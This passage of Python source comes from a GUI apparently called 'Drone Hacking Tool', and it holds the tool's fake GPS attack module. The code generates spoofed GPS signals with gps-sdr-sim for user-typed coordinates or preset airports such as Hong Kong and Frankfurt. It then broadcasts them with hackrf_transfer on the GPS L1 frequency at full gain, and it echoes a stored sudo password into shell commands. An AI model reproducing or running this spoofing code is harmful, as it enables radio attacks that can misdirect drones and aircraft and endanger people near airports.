        self.latitude_label_latitude_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.longitude_label_longitude_inputbox_frame = tk.Frame(self)
        self.longitude_label_longitude_inputbox_frame.config(background = "white")
        self.longitude_label = tk.Label(self.longitude_label_longitude_inputbox_frame, background = "white", text = "Longitude: ", font = "self.controller.label_font")
        self.longitude_label.pack(side = "left", anchor = "w")

        self.longitude_inputbox = tk.Entry(self.longitude_label_longitude_inputbox_frame, font = "self.controller.label_font")
        self.longitude_inputbox.pack(fill = "x")
        self.longitude_inputbox.config(state = "disable")
        self.longitude_label_longitude_inputbox_frame.pack(side = "top", fill = "both", pady = 10)

        self.footer_frame = tk.Frame(self)
        self.footer_frame.config(background = "white")
        self.progressbar = ttk.Progressbar(self.footer_frame, style = "green.Horizontal.TProgressbar", orient = "horizontal", mode = "indeterminate")
        self.progressbar.pack(side = "top", fill = "x")
        
        self.info_label = tk.Label(self.footer_frame, background = "white", text = "Please select or type in a location for fake GPS attack.", font = self.controller.info_font)
        self.info_label.pack(side = "left", anchor = "sw", pady = 5)

        try:
            self.bace_to_homepage_button_icon = tk.PhotoImage(file = current_path + "/data/gui_img/home_icon.png")
            self.attack_button_start_icon = tk.PhotoImage(file = current_path + "/data/gui_img/start_icon.png")
            self.attack_button_stop_icon = tk.PhotoImage(file = current_path + "/data/gui_img/fail_icon.png")

            self.bace_to_homepage_button = tk.Button(self.footer_frame, background = "white", text = "Back to homepage", font = self.controller.button_font, image = self.bace_to_homepage_button_icon, compound = "left",
                                        command = lambda: threading.Thread(target = self.destroy_rf_attack_gui).start())
            self.bace_to_homepage_button.pack(side = "right", anchor = "se")
                
            self.attack_button = tk.Button(self.footer_frame, background = "white", text = "Start attack", font = self.controller.button_font, image = self.attack_button_start_icon, compound = "left", state = "disable",
                                        command = lambda: threading.Thread(target = self.check_selection).start())
            self.attack_button.pack(side = "right", anchor = "se")
        except: #If icon not found
            self.bace_to_homepage_button = tk.Button(self.footer_frame, background = "white", text = "Back to homepage", font = self.controller.button_font,
                                        command = lambda: threading.Thread(target = self.destroy_rf_attack_gui).start())
            self.bace_to_homepage_button.pack(side = "right", anchor = "se")

            self.attack_button = tk.Button(self.footer_frame, background = "white", text = "Start attack", font = self.controller.button_font, state = "disable",
                                        command = lambda: threading.Thread(target = self.check_selection).start())
            self.attack_button.pack(side = "right", anchor = "se")
        self.footer_frame.pack(side = "bottom", fill = "both")

    def menubar(self, tool):
        menubar = tk.Menu(tool)
        option_tool = tk.Menu(menubar, tearoff = 0)
        option_tool.add_command(label = "Back", command = lambda: [self.destroy_rf_attack_gui(), self.controller.show_frame("FindHackrfDevice")])
        option_tool.add_separator()  
        option_tool.add_command(label = "Exit", command = lambda: quit())
        menubar.add_cascade(label = "Option", menu = option_tool)
        help_tool = tk.Menu(menubar, tearoff = 0)
        help_tool.add_command(label = "Page guide", command = lambda: messagebox.showinfo("Page Guide",
                                    "For the fake GPS function, please select one location or select 'Customize' to type your GPS coordinate on the page.\n\nAfter that, press the 'Start attack' button to start the transmission of the fake GPS signal until you press the 'Stop attack' button."))
        help_tool.add_command(label = "About", command = lambda: messagebox.showinfo("Drone Hacking Tool",
                                    "Code name: Barbary lion\nVersion: 1.1.2.111\n\nGroup member:\nSam KAN\nMichael YUEN\nDicky SHEK"))
        menubar.add_cascade(label = "Help", menu = help_tool)
        return menubar
    
    def get_selected_location(self, *args): #Get user selected location
        get_user_selected_location = self.location_select_list_variable.get()
        self.user_selected_location = str(get_user_selected_location)
        #print(self.user_selected_location)
        self.attack_button.config(state = "normal")
        if self.user_selected_location == "Customize":
            try:
                self.world_map_display = tk.PhotoImage(file = current_path + "/data/gui_img/world_map.png")
                self.world_map_display_label.config(image = self.world_map_display)
            except:
                self.world_map_display_label.config(text = "Unable to display this image.")    
            if self.messagebox_tips_state == True:
                if messagebox.showinfo("Tips", "Latitude and longitude inputbox type in format:\n\nDDD.DDDDD°"):
                    self.messagebox_tips_state = False
            self.latitude_inputbox.config(state = "normal")
            self.latitude_inputbox.delete(0, "end") #Clear inputbox string
            self.longitude_inputbox.config(state = "normal")
            self.longitude_inputbox.delete(0, "end") #Clear inputbox string
        else:
            if self.check_airports_location_list.is_file(): #Check "airports_location_list" is really exist
                read_airports_location_list_cap = pd.read_csv(current_path + "/data/airports_location_list.csv") #Read csv "airports_location_list.csv" file
                read_airports_location_list_df = pd.DataFrame(read_airports_location_list_cap)
                get_airports_location_list = read_airports_location_list_df[read_airports_location_list_df["Airport"].str.contains(self.user_selected_location)]
                consider_airports_location_list_latitude = get_airports_location_list[["Latitude"]]
                consider_airports_location_list_longitude = get_airports_location_list[["Longitude"]]
                airports_latitude_list = consider_airports_location_list_latitude.values.tolist()
                airports_longitude_list = consider_airports_location_list_longitude.values.tolist()
                airports_latitude_list_strip = str(airports_latitude_list) #Convert to string
                airports_longitude_list_strip = str(airports_longitude_list) #Convert to string
                self.airports_latitude = airports_latitude_list_strip.strip("[]") #Remove characters "[]"
                self.airports_longitude = airports_longitude_list_strip.strip("[]") #Remove characters "[]"
                #print(self.airports_latitude)
                #print(self.airports_longitude)
                self.latitude_inputbox.config(state = "normal")
                self.latitude_inputbox.delete(0, "end") #Clear inputbox string
                self.latitude_inputbox.insert(0, self.airports_latitude)
                self.latitude_inputbox.config(state = "disable")
                self.longitude_inputbox.config(state = "normal")
                self.longitude_inputbox.delete(0, "end") #Clear inputbox string
                self.longitude_inputbox.insert(0, self.airports_longitude)
                self.longitude_inputbox.config(state = "disable")
            if self.user_selected_location == "Hong Kong International Airport": #Display airport image
                try:
                    self.hong_kong_international_airport_image = tk.PhotoImage(file = current_path + "/data/gui_img/hong_kong_international_airport.png")
                    self.world_map_display_label.config(image = self.hong_kong_international_airport_image)
                except:
                    self.world_map_display_label.config(text = "Unable to display this image.")
            elif self.user_selected_location == "Frankfurt Airport":
                try:
                    self.frankfurt_airport_image = tk.PhotoImage(file = current_path + "/data/gui_img/frankfurt_airport.png")
                    self.world_map_display_label.config(image = self.frankfurt_airport_image)
                except:
                    self.world_map_display_label.config(text = "Unable to display this image.")
            elif self.user_selected_location == "Kansai International Airport":
                try:
                    self.kansai_international_airport_image = tk.PhotoImage(file = current_path + "/data/gui_img/kansai_international_airport.png")
                    self.world_map_display_label.config(image = self.kansai_international_airport_image)
                except:
                    self.world_map_display_label.config(text = "Unable to display this image.")
            elif self.user_selected_location == "Singapore Changi Airport":
                try:
                    self.singapore_changi_airport_image = tk.PhotoImage(file = current_path + "/data/gui_img/singapore_changi_airport.png")
                    self.world_map_display_label.config(image = self.singapore_changi_airport_image)
                except:
                    self.world_map_display_label.config(text = "Unable to display this image.")                 
            else:
                try:
                    self.world_map_display = tk.PhotoImage(file = current_path + "/data/gui_img/world_map.png")
                    self.world_map_display_label.config(image = self.world_map_display)
                except:
                    self.world_map_display_label.config(text = "Unable to display this image.")

    def check_selection(self): #Check user type in latitude and longitude data
        if self.user_selected_location == "Customize":
            self.get_user_type_in_latitude = self.latitude_inputbox.get()
            self.get_user_type_in_longitude = self.longitude_inputbox.get()
            #print(get_user_type_in_latitude)
            if self.get_user_type_in_latitude == "" and self.get_user_type_in_longitude == "":
                messagebox.showerror("Error", "You must fill in latitude and longitude data.")
            elif self.get_user_type_in_latitude == "":
                messagebox.showerror("Error", "You must fill in latitude data.")
            elif self.get_user_type_in_longitude == "":
                messagebox.showerror("Error", "You must fill in longitude data.")
            elif self.get_user_type_in_latitude != "" and self.get_user_type_in_longitude != "":
                try:
                    float(self.get_user_type_in_latitude)
                    try:
                        float(self.get_user_type_in_longitude)
                        self.fake_gps_attack()
                    except ValueError:
                        if messagebox.showerror("Error", "Wrong format for longitude input.\n\nFormat should be like: DDD.DDDDD°"):
                            self.longitude_inputbox.delete(0, "end") #Clear inputbox string
                except ValueError:
                    try:
                        float(self.get_user_type_in_longitude)
                        format_value_error_states = False
                    except ValueError:
                        format_value_error_states = True
                        if messagebox.showerror("Error", "Wrong format for latitude and longitude input.\n\nFormat should be like: DDD.DDDDD°"):
                            self.latitude_inputbox.delete(0, "end") #Clear inputbox string
                            self.longitude_inputbox.delete(0, "end") #Clear inputbox string
                    if format_value_error_states == False:
                        try:
                            float(self.get_user_type_in_latitude)
                        except ValueError:
                            if messagebox.showerror("Error", "Wrong format for latitude input.\n\nFormat should be like: DDD.DDDDD°"):
                                self.latitude_inputbox.delete(0, "end") #Clear inputbox string
        else:
            self.fake_gps_attack()
        
    def fake_gps_attack(self): #Generate fake gps file and transmission fake GPS signal
        if self.user_selected_location == "Customize":
            generate_fake_gps_file = "cd " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim; ./gps-sdr-sim -b 8 -e brdc1040.21n -l " + self.get_user_type_in_latitude + "," + self.get_user_type_in_longitude + ",100"
            self.latitude_inputbox.config(state = "disable")
            self.longitude_inputbox.config(state = "disable")
            self.bace_to_homepage_button.config(state = "disable")
            self.attack_button.config(state = "disable")
            #print(generate_fake_gps_file)
            self.progressbar.start()
            self.info_label.config(text = "Please wait for about 1 minute, generating fake GPS file.")
            show_fake_gps_attack_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_fake_gps_attack_timestamp]
                states_log = ["Generating fake GPS file, latitude: " + self.get_user_type_in_latitude + ", longitude:" + self.get_user_type_in_longitude]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv"  
            generate_fake_gps_states = subprocess.Popen(generate_fake_gps_file, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
            generate_fake_gps_states.communicate()
            self.attack_button.config(state = "normal")
            self.info_label.config(text = "Transmission fake GPS signal.")
            try:
                self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
            except: #If icon not found
                self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
            show_fake_gps_attack_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_fake_gps_attack_timestamp]
                states_log = ["Transmission fake GPS file, latitude: " + self.get_user_type_in_latitude + ", longitude: " + self.get_user_type_in_longitude]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv" 
            transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
            transmission_fake_gps_states.communicate()
            self.info_label.config(text = "Completed.")
            self.latitude_inputbox.config(state = "normal")
            self.longitude_inputbox.config(state = "normal")
            self.bace_to_homepage_button.config(state = "normal")
            self.progressbar.stop()
            try:
                self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
            except: #If icon not found
                self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())
        else:
            self.bace_to_homepage_button.config(state = "disable")
            self.attack_button.config(state = "disable")
            show_fake_gps_attack_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
            self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
            if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
                target_BSSID_log = [""]
                channel_log = [""]
                privacy_log = [""]
                password_log = [""]
                manufacturer_log = [""]
                client_BSSID_log = [""]
                selected_ap_timestamp_log = [show_fake_gps_attack_timestamp]
                states_log = ["Transmission fake GPS file, latitude: " + self.airports_latitude + ", longitude: " + self.airports_longitude + ", airport: " + self.user_selected_location]
                dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
                dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv" 
            if self.user_selected_location == "Hong Kong International Airport":
                self.progressbar.start()
                self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/hong_kong_international_airport.bin")
                if self.check_fake_gps_file.is_file():
                    self.attack_button.config(state = "normal")
                    self.info_label.config(text = "Transmission fake GPS signal.")
                    try:
                        self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
                    except: #If icon not found
                        self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
                    transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/hong_kong_international_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
                    transmission_fake_gps_states.communicate()
                    self.info_label.config(text = "Completed.")
                    self.bace_to_homepage_button.config(state = "normal")
                    self.progressbar.stop()
                    try:
                        self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
                    except: #If icon not found
                        self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())  
                else:
                   self.fake_gps_attack_file_missing()
            elif self.user_selected_location == "Frankfurt Airport":
                self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/frankfurt_airport.bin")
                if self.check_fake_gps_file.is_file():
                    self.progressbar.start()
                    self.attack_button.config(state = "normal")
                    self.info_label.config(text = "Transmission fake GPS signal.")
                    try:
                        self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
                    except: #If icon not found
                        self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
                    transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/frankfurt_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
                    transmission_fake_gps_states.communicate()
                    self.info_label.config(text = "Completed.")
                    self.bace_to_homepage_button.config(state = "normal")
                    self.progressbar.stop()
                    try:
                        self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
                    except: #If icon not found
                        self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())  
                else:
                    self.fake_gps_attack_file_missing()
            elif self.user_selected_location == "Kansai International Airport":
                self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/kansai_international_airport.bin")
                if self.check_fake_gps_file.is_file():
                    self.progressbar.start()
                    self.attack_button.config(state = "normal")
                    self.info_label.config(text = "Transmission fake GPS signal.")
                    try:
                        self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
                    except: #If icon not found
                        self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
                    transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/kansai_international_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
                    transmission_fake_gps_states.communicate()
                    self.info_label.config(text = "Completed.")
                    self.bace_to_homepage_button.config(state = "normal")
                    self.progressbar.stop()
                    try:
                        self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
                    except: #If icon not found
                        self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())  
                else:
                    self.fake_gps_attack_file_missing()
            elif self.user_selected_location == "Singapore Changi Airport":
                self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/singapore_changi_airport.bin")
                if self.check_fake_gps_file.is_file():
                    self.progressbar.start()
                    self.attack_button.config(state = "normal")
                    self.info_label.config(text = "Transmission fake GPS signal.")
                    try:
                        self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
                    except: #If icon not found
                        self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
                    transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/singapore_changi_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
                    transmission_fake_gps_states.communicate()
                    self.info_label.config(text = "Completed.")
                    self.bace_to_homepage_button.config(state = "normal")
                    self.progressbar.stop()
                    try:
                        self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
                    except: #If icon not found
                        self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())  
                else:
                    self.fake_gps_attack_file_missing()
            else:
                self.fake_gps_attack_file_missing()

    def fake_gps_attack_file_missing(self):
        show_fake_gps_attack_timestamp = time.strftime("%Y/%m/%d-%H:%M:%S") #Create a timestamp
        self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
        if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
            target_BSSID_log = [""]
            channel_log = [""]
            privacy_log = [""]
            password_log = [""]
            manufacturer_log = [""]
            client_BSSID_log = [""]
            selected_ap_timestamp_log = [show_fake_gps_attack_timestamp]
            states_log = ["Error: Fake GPS attack file not found. Generating fake GPS file, latitude: " + self.get_user_type_in_latitude + ", longitude: " + self.get_user_type_in_longitude + ", airport: " + self.user_selected_location]
            dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
            dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv" 
        generate_fake_gps_file = "cd " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim; ./gps-sdr-sim -b 8 -e brdc1040.21n -l " + self.airports_latitude + "," + self.airports_longitude + ",100"
        #print(generate_fake_gps_file)
        self.progressbar.start()
        self.info_label.config(text = "Please wait for about 1 minute, generating fake GPS file.")
        generate_fake_gps_states = subprocess.Popen(generate_fake_gps_file, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        generate_fake_gps_states.communicate()            
        self.attack_button.config(state = "normal")
        self.info_label.config(text = "Transmission fake GPS signal.")
        try:
            self.attack_button.config(text = "Stop attack", image = self.attack_button_stop_icon, command = lambda: self.stop_attack())
        except: #If icon not found
            self.attack_button.config(text = "Stop attack", command = lambda: self.stop_attack())
        self.check_log_file = Path(current_path + "/data/hack_drone_log.csv")
        if self.check_log_file.is_file(): #Check "hack_drone_log.csv" is really exist
            target_BSSID_log = [""]
            channel_log = [""]
            privacy_log = [""]
            password_log = [""]
            manufacturer_log = [""]
            client_BSSID_log = [""]
            selected_ap_timestamp_log = [show_fake_gps_attack_timestamp]
            states_log = ["Transmission fake GPS file, latitude: " + self.get_user_type_in_latitude + ", longitude: " + self.get_user_type_in_longitude + ", airport: " + self.user_selected_location]
            dataframe = pd.DataFrame({"target_BSSID":target_BSSID_log, "channel":channel_log, "privacy":privacy_log, "password":password_log, "manufacturer":manufacturer_log, "client_BSSID":client_BSSID_log,"timestamp":selected_ap_timestamp_log, "states":states_log})
            dataframe.to_csv(current_path + "/data/hack_drone_log.csv", index = False, sep = ',', mode = "a", header = False) #Write log data to "drone_attack_log.csv" 
        transmission_fake_gps_states = subprocess.Popen("echo " + sudo_password + " | sudo -S hackrf_transfer -t " + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47 -R", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        transmission_fake_gps_states.communicate()
        self.info_label.config(text = "Completed.")
        self.bace_to_homepage_button.config(state = "normal")
        self.progressbar.stop()
        try:
            self.attack_button.config(text = "Start attack", image = self.attack_button_start_icon, command = lambda: threading.Thread(target = self.check_selection).start())
        except: #If icon not found
           self.attack_button.config(text = "Start attack", command = lambda: threading.Thread(target = self.check_selection).start())

    def stop_attack(self): #Stop fake GPS signal transmission
        if self.user_selected_location == "Customize":
            subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
            time.sleep(0.1)
            self.latitude_inputbox.config(state = "normal")
            self.longitude_inputbox.config(state = "normal")
        elif self.user_selected_location == "Hong Kong International Airport":
            self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/hong_kong_international_airport.bin")
            if self.check_fake_gps_file.is_file():
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/hong_kong_international_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
            else:
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
        elif self.user_selected_location == "Frankfurt Airport":
            self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/frankfurt_airport.bin")
            if self.check_fake_gps_file.is_file():
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/frankfurt_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
            else:
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
        elif self.user_selected_location == "Kansai International Airport":
            self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/kansai_international_airport.bin")
            if self.check_fake_gps_file.is_file():
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/kansai_international_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
            else:
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
        elif self.user_selected_location == "Singapore Changi Airport":
            self.check_fake_gps_file = Path(current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/singapore_changi_airport.bin")
            if self.check_fake_gps_file.is_file():
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/singapore_changi_airport.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
            else:
                subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
        else:
            subprocess.Popen("ps aux | grep '" + current_path + "/driver/GPS_SDR_SIM/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47' | awk '{print $2}' | xargs sudo kill -9", stdout = subprocess.PIPE, shell = True) #Close fake GPS
        time.sleep(0.1)
        subprocess.Popen("hackrf_info", stdout = subprocess.PIPE, stderr = subprocess.STDOUT, shell = True, universal_newlines = True).stdout #Just for refresh PortaPack screen
        self.bace_to_homepage_button.config(state = "normal")
        self.progressbar.stop()

    def destroy_rf_attack_gui(self):
        self.title_label.destroy()
        self.world_map_display_label.destroy()
        self.location_select_list.destroy()
        self.latitude_label.destroy()
        self.latitude_inputbox.destroy()
        self.latitude_label_latitude_inputbox_frame.destroy()
        self.longitude_label.destroy()
        self.longitude_inputbox.destroy()
        self.longitude_label_longitude_inputbox_frame.destroy()
        self.progressbar.destroy()
        self.info_label.destroy()
        self.bace_to_homepage_button.destroy()
        self.attack_button.destroy()
        self.footer_frame.destroy()
        self.messagebox_tips_state = True
        self.controller.show_frame("StartPage")


if __name__ == "__main__":
    app = SampleApp()
    app.title("Drone Hacking Tool")
    app.geometry("850x800+200+200")
    app.resizable(False, False)
    try: #Set windows icon
        app.iconphoto(True, tk.PhotoImage(file = current_path + "/data/gui_img/drone_main_icon.png"))
    except:
        pass
    print(" P100      CEEFAX 1    100             Mon 13 Jun 19:27/35 ")
    print(" █████████████████          ████████████                   ")
    print(" ████████  █████ █            █        █                   ")
    print(" ████████  █████ █ ██████████ █  ███████ █████████████████ ")
    print(" ████████  █████ █ █        █ █  ███████ █  ████  ████████ ")
    print(" ████████        █ █  █████ █ █  ███████ █  ███  █████████ ")
    print(" ████████  █████ █ █  █████ █ █  ███████ █  ██  ██████████ ")
    print(" ████████  █████ █ █        █ █  ███████ █     ███████████ ")
    print(" ████████  █████ █ █  █████ █ █  ███████ █  ██  ██████████ ")
    print(" ████████  █████ █ █  █████ █ █        █ █  ███  █████████ ")
    print(" █████████████████ █  █████ █ ██████████ █  ████  ████████ ")
    print("                   █  █████ █            █  ████  ████████ ")
    print("                 ████████████          ███████████████████ ")
    print("                      Ver: 1.1.2.111                       ")
    print("       ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░        ")
    print("       ░    ░░░ ░     ░░ ░      ░ ░ ░░░░ ░ ░      ░        ")
    print("       ░ ░░░ ░░ ░ ░░░░ ░ ░ ░░░░ ░ ░  ░░░ ░ ░ ░░░░░░        ")
    print("       ░ ░░░░ ░ ░     ░░ ░ ░░░░ ░ ░ ░ ░░ ░ ░     ░░        ")
    print("       ░ ░░░░ ░ ░ ░░░░ ░ ░ ░░░░ ░ ░ ░░ ░ ░ ░ ░░░░░░        ")
    print("       ░ ░░░ ░░ ░ ░░░░ ░ ░ ░░░░ ░ ░ ░░░  ░ ░ ░░░░░░        ")
    print("       ░    ░░░ ░ ░░░░ ░ ░      ░ ░ ░░░░ ░ ░      ░        ")
    print("       ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░ ░░░░░░░░        ")
    app.mainloop()